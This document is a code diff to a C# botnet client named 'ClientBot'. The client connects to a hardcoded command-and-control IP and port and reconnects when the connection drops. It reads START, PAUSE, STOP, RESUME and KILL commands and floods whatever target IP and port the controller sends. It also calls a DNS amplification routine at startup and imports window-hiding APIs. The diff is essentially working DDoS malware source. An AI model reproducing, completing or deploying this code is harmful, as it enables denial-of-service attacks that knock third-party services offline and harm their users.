@@ -8,61 +8,73 @@ using System.Net;
 using System.Net.Sockets;
 using System.Text.RegularExpressions;
 using Microsoft.Win32;
-
+using Client;
+using System.Net.NetworkInformation;
+using System.Runtime.InteropServices;
 
 namespace ClientBot
 {
     class Client
     {
+        
         static IPAddress host = IPAddress.Parse("142.129.157.81");
         static int port = 22580;
         static IPAddress client;
         static Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
         static TcpClient hostServer = new TcpClient();
-        static TcpListener listener = new TcpListener(host, port);
         static bool stop = false;
         static bool pause = false;
-        static bool start = true;
+        static bool start = false;
+        static bool kill = false;
+        static string[] a;
+        static string[] command;
+        public static State clientState;
+        IPv4InterfaceStatistics interfaceStats = null;
+        [DllImport("Kernel32.dll")]
+        public static extern IntPtr GetConsoleWindow();
+        [DllImport("User32.dll")]
+        private static extern bool ShowWindow(IntPtr hWnd, int cmdShow);
         static void Main(string[] args)
         {
-            if (ClientBot.Initializer.startUp() == true)
+            IntPtr hWnd = GetConsoleWindow();
+            //ShowWindow(hWnd, 1);
+            Console.ForegroundColor = ConsoleColor.White;
+            if (ClientBot.Initializer.startUp() == true&&ClientBot.Initializer.shortcut()==true)
             {
-                Console.Write("IP " + getIP());
+               Console.Write(getTime()+"IP " + getIP());
                 client = getIP();
+                Logger.Initialize();
+                ClientBot.SEND.dnsAmplifcation();
                 Connect();
             }
         }
         static void Connect()
         {
-            socket.Blocking = true;
+            
             try
             {
-                hostServer.Client.Connect(host, port);
-                Console.WriteLine("\n it worked ");
-                Listen();
+                hostServer.Connect(host, port);
+                Console.WriteLine(getTime()+" it worked ");
+                Thread ListenTask = new Thread(() => Listen());
+                ListenTask.Start();
+                var readTask = read();
+                readTask.Wait();
                 
             }
             catch(SocketException e)
             {
                 Console.ForegroundColor = ConsoleColor.Red;
-                Console.WriteLine("Error: " + e.ToString());
+                Console.WriteLine(getTime() + "Error: " + e.ToString());
                 Console.ForegroundColor = ConsoleColor.Green;
-                Console.WriteLine("reconnecting in 10 seconds");
+                Console.WriteLine(getTime() + "reconnecting in 10 seconds");
                 Thread.Sleep(10000);
                 Connect();
             }
            
 
         }
-        static void Listen()
+        public static void Listen()
         {
-            //byte[] received = new byte[200];
-            // listener.Start();
-            // TcpClient tcp = listener.AcceptTcpClient();
-            // NetworkStream stream = tcp.GetStream();
-            //  string recieve = stream.Read(received,0,received.Length).ToString();
-            // Console.WriteLine(recieve);
-            //
             try
             {
                 int i = 0;
@@ -75,77 +87,160 @@ namespace ClientBot
                 IPAddress sentIP = IPAddress.Parse(info[0]);
                 int sentPort = int.Parse(info[1]);
                 int sentData = int.Parse(info[2]);
+                setPreviousCommand(info);
                 Console.WriteLine(StrData);
                 sendSpeed();
-                Task.Run(() =>
-                {
-                    while (!stop)
-                    {
-                        read();
-                    }
-                });
-                while(ClientBot.DDOS.sendData(sentIP,sentPort,sentData,"hello there"))
-                {
-                    if (!stop)
-                    {
-                        i++;
-                        Console.Write("\r DDOSING iteration:{0} ", i);
-                    }
-                    else if(stop)
-                    {
-                        Console.WriteLine("Breaking Out");
-                        break;
-                    }
-                }
-                if(ClientBot.DDOS.sendData(sentIP, sentPort, sentData, "hello there"))
-                {
-                    if(stop)
-                    {
-                        Console.WriteLine("Stop Command Recieved");
-                    }
-                    Console.WriteLine("Shit broken");
-                }
-                Console.WriteLine("Press any key to exit");
-                Console.ReadKey();
+                clientState = State.CLIENT_SEND;
+                Console.WriteLine("sending now");
+                Send(sentIP, sentPort, sentData);
             }
             catch(Exception e)
             {
-                Console.WriteLine("shit happens " + e);
+                Console.WriteLine(getTime() + "shit happens " + e);
+                Restart();
+                
             }
         }
-        static string read()
+        static void task()
         {
-            string commandStop = Command.STOP.ToString();
-            string commandPause = Command.PAUSE.ToString();
-            string commandStart = Command.START.ToString();
-            string ret;
-            NetworkStream stream = hostServer.GetStream();
-            byte[] data = new byte[1024];
-            int receivedData = stream.Read(data, 0, data.Length);
-            ret = Encoding.ASCII.GetString(data,0,receivedData);
+            Console.WriteLine("task called");
+            read();
+            Task.Run(() =>
+            {
+                
+                    read();
+                    Task.WaitAll();
+                    
+            });
+        }
+        static void Send(IPAddress ip,int port, int dataAmount)
+        {
+            Task.Run(() =>
+            {
+                
+                    read();
+                    Task.WaitAll();
+                
+            });
+            try
+            {
+                int i = 0;
+                while (ClientBot.SEND.sendData(ip, port, dataAmount, "hello there"))
+                {
+
+                    if (clientState == State.CLIENT_SEND)
+                    {
+                        i++;
+                        Console.Write("\r {0} Sending iteration:{1} ", getTime(), i);
+                        Console.Write("\r " + clientState);
+                    }
+                    else if (clientState == State.CLIENT_STOP)
+                    {
+                        Console.WriteLine(getTime() + "Breaking Out");
+                        break;
+                    }
+                    else if (clientState == State.CLIENT_PAUSE)
+                    {
+                        Console.WriteLine(getTime() + "Pause Command Received");
+                        break;
+                    }
+                }
+                task();
+                
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(getTime() + "shit happens " + e);
+                Restart();
+
+            }
+
+        }
+        static async Task read()
+        {
+            await Task.Run(() =>
+            {
+                while (!kill)
+                {
+                    Console.WriteLine("reading startedd");
+                    string commandStop = Command.STOP.ToString();
+                    string commandPause = Command.PAUSE.ToString();
+                    string commandStart = Command.START.ToString();
+                    string ret = string.Empty;
+                    NetworkStream stream = hostServer.GetStream();
+                    byte[] data = new byte[1024];
+                    int receivedData = stream.Read(data, 0, data.Length);
+                    ret = Encoding.ASCII.GetString(data, 0, receivedData);
+
+                    if (ret.Equals(commandStop))
+                    {
+                        Console.WriteLine(getTime() + "Command received " + ret);
+                        clientState = State.CLIENT_STOP;
+                    }
+                    else if (ret.Equals(commandPause))
+                    {
+                        Console.WriteLine(getTime() + "Command received " + ret);
+                        clientState = State.CLIENT_PAUSE;
+                    }
+                    else if (ret.Equals(Command.START.ToString()))
+                    {
+                        Console.WriteLine(getTime() + "Command received " + ret);
+                        clientState = State.CLIENT_SEND;
+                        Listen();
+
+                    }
+                    else if (ret.Equals(Command.RESUME.ToString()))
+                    {
+                        try
+                        {
+                            clientState = State.CLIENT_SEND;
+                            Console.WriteLine(getTime() + "Command received" + ret);
+                            foreach (string a in command)
+                            {
+                                Console.WriteLine(a + " niasd ");
+                            }
+                            IPAddress sentIP = IPAddress.Parse(command[0]);
+                            int sentPort = int.Parse(command[1]);
+                            int sentData = int.Parse(command[2]);
+                            Console.WriteLine(getTime() + " sending " + command[0].ToString() + " " + command[1].ToString() + " " + command[2].ToString());
+                            Send(sentIP, sentPort, sentData);
+                        }
+                        catch (Exception e)
+                        {
+                            Console.WriteLine("Resume error" + e);
+                            Restart();
+                        }
+                    }
+                    else if (ret.Equals(Command.KILL.ToString()))
+                    {
+                        Console.WriteLine("Exiting");
+                        Thread.Sleep(10000);
+                        KillApp();
+                    }
+                    else
+                    {
+                        Console.WriteLine("IDK WHAT TO DO");
+                        Thread.Sleep(10000);
+                        read();
+                    }
+                }
+            });
             
-            if(ret.Equals(commandStop))
-            {
-                Console.WriteLine("Command received "+ret);
-                stop = true;
-                pause = false;
-                start = false;
-            }
-            else if(ret.Equals(commandPause))
-            {
-                Console.WriteLine("Command received " + ret);
-                stop = false;
-                pause = true;
-                start = false;
-            }
-            else if(ret.Equals(commandStart))
-            {
-                Console.WriteLine("Command received " + ret);
-                stop = false;
-                pause = false;
-                start = true;
-            }
-                return ret;
+            //    return ret;
+        }
+        static void setPreviousCommand(string[] a)
+        {
+
+            command = a; 
+        }
+        static string[] getPreviousCommand()
+        {
+            
+            return command;
+        }
+        static void write(string text)
+        {
+
         }
         static IPAddress getIP()
         {
@@ -195,6 +290,12 @@ namespace ClientBot
             speed++;
             return speed;
         }
+
+        public static string getTime()
+        {
+            string time = "["+DateTime.Now.ToString("hh:mm:ss")+"]: ";
+            return time;
+        }
         static void sendSpeed()
         {
             NetworkStream stream = hostServer.GetStream();
@@ -203,12 +304,33 @@ namespace ClientBot
             string toSend = ip +"$"+ speed;
             stream.Write(Encoding.ASCII.GetBytes(toSend), 0, Encoding.ASCII.GetBytes(toSend).Length);
         }
+        static void KillApp()
+        {
+            //Environment.Exit(0);
+        }
+        static void Restart()
+        {
+            hostServer = null;
+            hostServer = new TcpClient();
+            Connect();
+        }
+        
     } 
     public enum Command
     {
         START,
         PAUSE,
-        STOP
+        STOP,
+        RESUME,
+        KILL
+    }
+    public enum State
+    {
+        HOST_DISCONNECT,
+        CLIENT_DISCONNECT,
+        CLIENT_SEND,
+        CLIENT_PAUSE,
+        CLIENT_STOP
     }
 }
 
